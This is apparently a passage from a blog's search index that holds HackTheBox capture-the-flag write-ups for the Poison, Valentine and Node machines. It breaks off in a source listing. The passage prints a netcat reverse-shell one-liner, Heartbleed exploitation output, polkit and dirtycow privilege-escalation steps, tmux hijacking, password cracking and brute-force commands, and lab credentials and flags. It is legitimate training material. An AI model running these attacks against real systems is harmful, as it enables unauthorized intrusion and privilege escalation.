RVJhZWpBNVEyYzlQUW89Cg== VlZSS2IyRkhUblJpUkZKS1ZrVnNjVlJyVGxaTmEzQnhXakk1VGxGVU1EbERaejA5Q2c9PQo= VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg== UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg== Q2hhcml4ITIjNCU2JjgoMA== Charix!2#4%6&amp;amp;8(0 charix:Charix!2#4%6&amp;amp;8(0 SSH w/ charix:Charix!2#4%6&amp;amp;8(0 ┌──(root💀kali)-[~/htb/poison]└─# sshpass -p &#39;Charix!2#4%6&amp;amp;8(0&#39; ssh charix@$ip User Flag eaacdfb2d141b72a589233063604209c Root - Via VNC running as root Proceed to charix home directory charix@Poison:~ % ls -l total 8 -rw-r----- 1 root charix 166 Mar 19 2018 secret.zip -rw-r----- 1 root charix 33 Mar 19 2018 user.txt Transfer file to kali Unzip w/ charix password, Charix!2#4%6&amp;amp;8(0 ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# unzip secret.zip Archive: secret.zip [secret.zip] secret password: extracting: secret ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# cat secret ��[|Ֆz! Unsure what kind of file is that, lets further enumerate the machine Found something interesting w/ linpeas.sh tightvnc - running as root TightVNC is a free remote desktop application Next, we look at LISTENING ports on poison.htb poison.htb is LISTENING on port 5801,5901, locally (127.0.0.1) 127.0.0.1:5801 127.0.0.1:5901 VNC ports In order to access VNC from our kali, we have to do port forwarding w/ SSH Tunnel ┌──(root💀kali)-[~/htb/poison] └─# sshpass -p &#39;Charix!2#4%6&amp;amp;8(0&#39; ssh -L5801:127.0.0.1:5801 -L5901:127.0.0.1:5901 charix@$ip On kali, port 5801 is forwarded to poison.htb on port 5801 On kali, port 5901 is forwarded to poison.htb on port 5901 Check if kali is listening ┌──(root💀kali)-[~/htb/poison/10.10.10.84/exploit] └─# nmap localhost -p 5801,5901 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 21:57 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.000043s latency). Other addresses for localhost (not scanned): ::1 PORT STATE SERVICE 5801/tcp open vnc-http-1 5901/tcp open vnc-1 Access VNC ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# vncviewer 127.0.0.1:5901 Connected to RFB server, using protocol version 3.8 Enabling TightVNC protocol extensions Performing standard VNC authentication Password: Authentication failed Requires password -passwd &amp;lt;PASSWD-FILENAME&amp;gt; (standard VNC authentication) Access VNC, specifying secret file from earlier as its passwd file ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# vncviewer -passwd secret 127.0.0.1:5901 Create reverse shell payload charix@Poison:/tmp % echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.31 4444 &amp;gt;/tmp/f&quot; &amp;gt; /tmp/exploit Invoke reverse shell /tmp/exploit Obtained Root &amp;amp; Root Flag! 716d04b188419cf2bb99d891272361f5 Decrypt VNC file w/ a tool ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot]└─# git clone https://github.com/jeroennijhof/vncpwdCloning into &#39;vncpwd&#39;...remote: Enumerating objects: 28, done.remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28Receiving objects: 100% (28/28), 22.15 KiB | 101.00 KiB/s, done.Resolving deltas: 100% (9/9), done.┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot]└─# cd vncpwd/┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot/vncpwd]└─# lsd3des.c d3des.h LICENSE Makefile README vncpwd.c┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot/vncpwd]└─# makegcc -Wall -g -o vncpwd vncpwd.c d3des.c┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot/vncpwd]└─# lsd3des.c d3des.h LICENSE Makefile README vncpwd vncpwd.c┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot/vncpwd]└─# ./vncpwd ../secretPassword: VNCP@$$! VNCP@$$! " }, { "title": "HackTheBox - Valentine", "url": "/posts/Valentine/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/kernel-exploit", "date": "2022-08-29 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering /dev directory and omg, inside /dev contains a hex encoded string, decoding it reveals a encrypted SSH private key. Next, omg reveals an image of a bleeding heart, hinting us to use an exploit called heartbleed which allows us to obtain the passphrase of the SSH private key. Inturn, allowing us to obtain hype user.For the privilege escalation part, there are 3 ways to do so. The first way is through CVE-2021-4034, polkit is vulnerable, allowing us to privilege escalate to root.The second way is by hijacking a tmux session, after enumerating the system w/ linpeas.sh, a tmux session running as root is identified. The socket of the tmux session is RW accessible to user hype, allowing hype to privilege escalate to root.The final way is via a kernel exploit called dirtycow Column Details Box Name Valentine IP 10.10.10.79 Points - Difficulty Easy Creator mrb3n Release Date 17-Feb-2018 ReconTCP/80 (HTTP)FFUF - common.txt403 GET 10l 30w 287c http://10.10.10.79/cgi-bin/403 GET 10l 30w 292c http://10.10.10.79/cgi-bin/.html200 GET 25l 54w 552c http://10.10.10.79/decode200 GET 25l 54w 552c http://10.10.10.79/decode.php301 GET 9l 28w 308c http://10.10.10.79/dev =&amp;gt; http://10.10.10.79/dev/200 GET 27l 54w 554c http://10.10.10.79/encode200 GET 27l 54w 554c http://10.10.10.79/encode.php200 GET 1l 2w 38c http://10.10.10.79/index200 GET 1l 2w 38c http://10.10.10.79/index.php403 GET 10l 30w 292c http://10.10.10.79/server-status encode.php decode.php /devFFUF - directory-list-2.3-medium.txt200 GET 1l 2w 38c http://10.10.10.79/index200 GET 1l 2w 38c http://10.10.10.79/index.php301 GET 9l 28w 308c http://10.10.10.79/dev =&amp;gt; http://10.10.10.79/dev/200 GET 27l 54w 554c http://10.10.10.79/encode200 GET 27l 54w 554c http://10.10.10.79/encode.php200 GET 25l 54w 552c http://10.10.10.79/decode200 GET 25l 54w 552c http://10.10.10.79/decode.php200 GET 620l 3539w 153356c http://10.10.10.79/omg omgInitial FootholdTCP/80 (HTTP) - Found Private Key Found hex string at http://valentine.htb/dev/hype_key ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# wget http://10.10.10.79/dev/hype_key --2022-08-29 01:20:31-- http://10.10.10.79/dev/hype_key Connecting to 10.10.10.79:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5383 (5.3K) Saving to: ‘hype_key’ hype_key 100%[==============================================&amp;gt;] 5.26K --.-KB/s in 0s 2022-08-29 01:20:31 (40.3 MB/s) - ‘hype_key’ saved [5383/5383] ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# head -c 200 hype_key 2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20┌ Decode it ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# cat hype_key | xxd -r -p | tee id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY-----┌ id_rsa - Encrypted Crack it w/ john # Convert to john format ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# python ssh2john.py id_rsa &amp;gt; id_rsa_john # Bruteforce ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john Failed At this point me stuck, so I looked for nudges at HackTheBox Forum The picture at index.php is a hint Username is obvious TCP/443 (HTTPS) - Heartbleed Proceed to http://valentine.htb Bleeding heart Search exploits named bleed/heart Exploit Title Path OpenSSL 1.0.1f TLS Heartbeat Extension - ‘Heartbleed’ Memory Disclosure (Multiple multiple/remote/32764.py OpenSSL TLS Heartbeat Extension - ‘Heartbleed’ Information Leak (1) multiple/remote/32791.c OpenSSL TLS Heartbeat Extension - ‘Heartbleed’ Information Leak (2) (DTLS Support) multiple/remote/32998.c OpenSSL TLS Heartbeat Extension - ‘Heartbleed’ Memory Disclosure multiple/remote/32745.py Try multiple/remote/32764.py 32745.py, did not work for me even though it looks the same How does it work? This serious flaw (CVE-2014-0160) is a missing bounds check before a memcpy() call that uses non-sanitized user input as the length parameter. An attacker can trick OpenSSL into allocating a 64KB buffer, copy more bytes than is necessary into the buffer, send that buffer back, and thus leak the contents of the victim’s memory, 64KB at a time. - Source This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. - Source Run exploit, extract base64 output ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/exploit] └─# cat bleed.out Trying SSL 3.0... Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0300, length = 94 ... received message: type = 22, ver = 0300, length = 885 ... received message: type = 22, ver = 0300, length = 331 ... received message: type = 22, ver = 0300, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0300, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....&quot;. 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 ................ 0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............3.2. 0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 ....E.D...../... 0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A............... 0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 ................ 0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 ..I...........4. 00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 2............... 00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 ................ 00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 ................ 00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E ....#.......0.0. 00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode.php..Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc 0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld 0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 15 mV0aGVoeXBlCg==. 0160: ED 9D 02 7D 42 4F CD 00 9F E3 EF 56 AF A6 08 99 ...}BO.....V.... 0170: 9F 76 59 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C .vY............. 0180: D2 81 18 3A 68 64 AE E9 57 93 E9 CE 14 B0 99 44 ...:hd..W......D 0190: 76 11 55 2D 00 15 00 68 00 00 00 00 00 00 00 00 v.U-...h........ $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== Decode it ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d heartbleedbelievethehype This should be the passphrase for the SSH private key TCP/22 (SSH) SSH w/ hype:heartbleedbelievethehype ┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot] └─# chmod 600; ssh hype@valentine.htb -i id_rsa User Flag e6710a5464769fd5fcd216e076961750 Privilege Escalation - 1Root - Via CVE-2021-4034 Found something interesting w/ linpeas.sh CVE-2021-4034 Try CVE-2021-4034.py How does the exploit work? Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. Due to an improper implementation of the pkexec tool, an out-of-bounds memory access can be leveraged by a local attacker to escalate their privileges to system root. Download Exploit Transfer to valentine.htb Run Exploit Obtained root Shell &amp;amp; root.txt f1bb6d759df1f272914ebbc9ed7765b2 Privilege Escalation - 2Root - Via TMUX hijack Found something interesting w/ linpeas.sh tmux - process running as root /.devs/dev_sess Check file privileges for /.devs/dev_sess hype@Valentine:/tmp$ ls -la /.devs/dev_sess srw-rw---- 1 root hype 0 Aug 27 13:49 /.devs/dev_sess hype@Valentine:/tmp$ groups hype cdrom dip plugdev sambashare user hype belongs to group hype group hype has RW access to /.devs/dev_sess This allows us to hijack the session running as root Hijack tmux to obtain root hype@Valentine:/tmp$ tmux -S /.devs/dev_sess Privilege Escalation - 3Root - Via Kernel Exploit Identify linux kernel version hype@Valentine:/tmp$ uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux 3.2.0-23-generic - vulnerable to dirtycow Try dirtycow exploit How does the exploit work? Download Exploit Transfer to valentine.htb Run Exploit hype@Valentine:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt hype@Valentine:/tmp$ ./dirty password hype@Valentine:/tmp$ su firefart " }, { "title": "HackTheBox - Node", "url": "/posts/Node/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/command-injection, linux-priv-esc/linux-creds-found, bof/linux-bof", "date": "2022-08-27 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, revealing a directory /api when intercepting a login request w/ burp. By directory enumerating /api, login credentials are revealed.After authenticating w/ an admin account, a password protected zipfile myplace.backup can be downloaded, after bruteforcing the password w/ fcrackzip, the entire source code of the web application is zipped, revealing SSH credentials, allowing us to obtain mark user.For privilege escalation, we first have to privilege escalate to mark using a task scheduler application running as tom that executes commands from a mongodb collection. With the credentials from earlier, we are able to access mongodb and insert a reverse shell into the mongodb collection, allowing us to privilege escalate to tomThere are 2 ways to privilege escalate to root. The first way is via command injection. There is a SUID binary backup that backups a directory that is specified, however there are filters such as /root, /etc, ;, |, which are filters that will prevent us from obtaining root.txt and doing command injection. However, command injection is still possible because the command is called by system, allowing us to insert/add commands w/ newlines (\\n), using printf, we are able to insert newlines and execute a shell as root, privilege escalating us to root.The second way is through bufferoverflow, ret2libc attack.TakeawaysI learnt about bufferoverflow ret2libc attack, and command injection Column Details Box Name Node IP 10.10.10.58 Points - Difficulty Medium Creator rastating Release Date 14-Oct-2017 ReconTCP/3000 (HTTP)FFUF┌──(root💀kali)-[~/htb/node]└─# ffuf -u http://$ip:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fw 727 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://10.10.10.58:3000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 727________________________________________________assets [Status: 301, Size: 171, Words: 7, Lines: 10]uploads [Status: 301, Size: 173, Words: 7, Lines: 10]vendor [Status: 301, Size: 171, Words: 7, Lines: 10]:: Progress: [27690/27690] :: Job [1/1] :: 1985 req/sec :: Duration: [0:00:19] :: Errors: 0 ::Initial FootholdTCP/3000 (HTTP) - Directory Enumerate /api Proceed to http://node.htb/login, determine if page is susceptible to SQLi Auth Bypass Failed Intercept w/ burpsuite /api/session/authenticate is queried JSON Request View files that are queried on this website Inspect Element -&amp;gt; Sources -&amp;gt; js -&amp;gt; app -&amp;gt; controllers Files in /api directory is being queried Enumerate files/dirs in /api ┌──(root💀kali)-[~/htb/node] └─# ffuf -u http://$ip:3000/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fw 727 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.58:3000/api/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 727 ________________________________________________ session [Status: 200, Size: 23, Words: 1, Lines: 1] users [Status: 200, Size: 611, Words: 1, Lines: 1] :: Progress: [27690/27690] :: Job [1/1] :: 1191 req/sec :: Duration: [0:00:17] :: Errors: 0 :: View enumerated directories session users ┌──(root💀kali)-[~/htb/node] └─# curl -s $ip:3000/api/users | python -m json.tool [ { &quot;_id&quot;: &quot;59a7365b98aa325cc03ee51c&quot;, &quot;is_admin&quot;: true, &quot;password&quot;: &quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;, &quot;username&quot;: &quot;myP14ceAdm1nAcc0uNT&quot; }, { &quot;_id&quot;: &quot;59a7368398aa325cc03ee51d&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;, &quot;username&quot;: &quot;tom&quot; }, { &quot;_id&quot;: &quot;59a7368e98aa325cc03ee51e&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;, &quot;username&quot;: &quot;mark&quot; }, { &quot;_id&quot;: &quot;59aa9781cced6f1d1490fce9&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;, &quot;username&quot;: &quot;rastating&quot; } ] Credentials obtained Extract usernames, passwords ┌──(root💀kali)-[~/htb/node] └─# curl -s $ip:3000/api/users | python -m json.tool | grep pass | cut -d &#39;:&#39; -f2 | sed &#39;s/\\&quot;,//g&#39; | cut -d &#39;&quot;&#39; -f2 |tee hashes.txt dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240 de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0 ┌──(root💀kali)-[~/htb/node] └─# curl -s $ip:3000/api/users | python -m json.tool | grep user | cut -d &#39;:&#39; -f2 | sed &#39;s/\\&quot;,//g&#39; | cut -d &#39;&quot;&#39; -f2 |tee usernames myP14ceAdm1nAcc0uNT tom mark rastating Crack hashes ┌──(root💀kali)-[~/htb/node] └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --show dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake ┌──(root💀kali)-[~/htb/node] └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --show | cut -d &#39;:&#39; -f2 | tee passwords.txt manchester spongebob snowflake ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# paste -d &#39;:&#39; usernames passwords.txt | tee hydra_creds.txt myP14ceAdm1nAcc0uNT:manchester tom:spongebob mark:snowflake rastating: TCP/22 (SSH) - Bruteforce Tried to SSH w/ our creds, failed ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# hydra -C hydra_creds.txt -e nsr ssh://$ip Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-13 18:29:24 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries, ~1 try per task [DATA] attacking ssh://10.10.10.58:22/ 1 of 1 target completed, 0 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-13 18:29:26 TCP/3000 (HTTP) - Backup file Login w/ myP14ceAdm1nAcc0uNT:manchester &amp;amp; download Backup Only myP14ceAdm1nAcc0uNT is an admin account, the rest are ordinary accounts Analyze myplace.backup Find out what kind of file it is ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# file myplace.backup myplace.backup: ASCII text, with very long lines (65536), with no line terminators ASCII text View contents .... AAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA= = is a padding used in base64 Decode the content of myplace.backup ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# cat myplace.backup | base64 -d &amp;gt; decoded_myplace.backup Find out what kind of file it is ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# file decoded_myplace.backup decoded_myplace.backup: Zip archive data, at least v1.0 to extract, compression method=store .zip file Extract it ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# mv decoded_myplace.backup decoded_myplace.zip ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# unzip decoded_myplace.zip Archive: decoded_myplace.zip creating: var/www/myplace/ [decoded_myplace.zip] var/www/myplace/package-lock.json password: Password protected Crack zip file Crack zip file w/ fcrackzip ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decoded_myplace.zip &#39;var/www/myplace/&#39; is not encrypted, skipping found file &#39;var/www/myplace/package-lock.json&#39;, (size cp/uc 4404/ 21264, flags 9, chk 0145) &#39;var/www/myplace/node_modules/&#39; is not encrypted, skipping &#39;var/www/myplace/node_modules/serve-static/&#39; is not encrypted, skipping found file &#39;var/www/myplace/node_modules/serve-static/README.md&#39;, (size cp/uc 2733/ 7508, flags 9, chk 1223) found file &#39;var/www/myplace/node_modules/serve-static/index.js&#39;, (size cp/uc 1640/ 4533, flags 9, chk b964) found file &#39;var/www/myplace/node_modules/serve-static/LICENSE&#39;, (size cp/uc 697/ 1189, flags 9, chk 1020) found file &#39;var/www/myplace/node_modules/serve-static/HISTORY.md&#39;, (size cp/uc 2625/ 8504, flags 9, chk 35bd) found file &#39;var/www/myplace/node_modules/serve-static/package.json&#39;, (size cp/uc 868/ 2175, flags 9, chk 0145) &#39;var/www/myplace/node_modules/utils-merge/&#39; is not encrypted, skipping found file &#39;var/www/myplace/node_modules/utils-merge/README.md&#39;, (size cp/uc 344/ 634, flags 9, chk 9f17) found file &#39;var/www/myplace/node_modules/utils-merge/index.js&#39;, (size cp/uc 219/ 381, flags 9, chk 9e03) 8 file maximum reached, skipping further files PASSWORD FOUND!!!!: pw == magicword Unzip decoded_myplace.zip ┌──(root💀kali)-[~/htb/node/10.10.10.58/exploit] └─# unzip decoded_myplace.zip Archive: decoded_myplace.zip creating: var/www/myplace/ [decoded_myplace.zip] var/www/myplace/package-lock.json password: magicword /var contains the files of the entire web application After browsing through the files, SSH credentials in app.js MongoDB database mark:5AYRft73VtFpc84k TCP/22 (SSH) SSH w/ mark:5AYRft73VtFpc84k ┌──(root💀kali)-[~/htb/node] └─# sshpass -p &#39;5AYRft73VtFpc84k&#39; ssh mark@10.10.10.58 Privilege Escalation - 1Tom - Via Adding task to scheduler View files in tom’s home directory mark@node:/home/tom$ ls -la total 40 drwxr-xr-x 6 root root 4096 Sep 3 2017 . drwxr-xr-x 5 root root 4096 Aug 31 2017 .. -rw-r--r-- 1 root root 220 Aug 29 2017 .bash_logout -rw-r--r-- 1 root root 3771 Aug 29 2017 .bashrc drwx------ 2 root root 4096 Aug 29 2017 .cache drwxr-xr-x 3 root root 4096 Aug 30 2017 .config -rw-r----- 1 root root 0 Sep 3 2017 .dbshell -rwxr-xr-x 1 root root 0 Aug 30 2017 .mongorc.js drwxrwxr-x 2 root root 4096 Aug 29 2017 .nano drwxr-xr-x 5 root root 4096 Aug 31 2017 .npm -rw-r--r-- 1 root root 655 Aug 29 2017 .profile -rw-r----- 1 root tom 33 Sep 3 2017 user.txt mark@node:/home/tom$ User Flag is there, we have to privilege escalate to Tom. Found something interesting w/ linpeas /usr/bin/node /var/scheduler/app.js scheduler running as tom /usr/bin/node /var/www/myplace/app.js Web application running as tom View contents of /var/scheduler/app.js mark@node:/home/tom$ cat /var/scheduler/app.js const exec = require(&#39;child_process&#39;).exec; const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;amp;authSource=scheduler&#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(&#39;[!] Failed to connect to mongodb&#39;); return; } setInterval(function () { db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) { if (!error &amp;amp;&amp;amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;); exec(doc.cmd); db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { 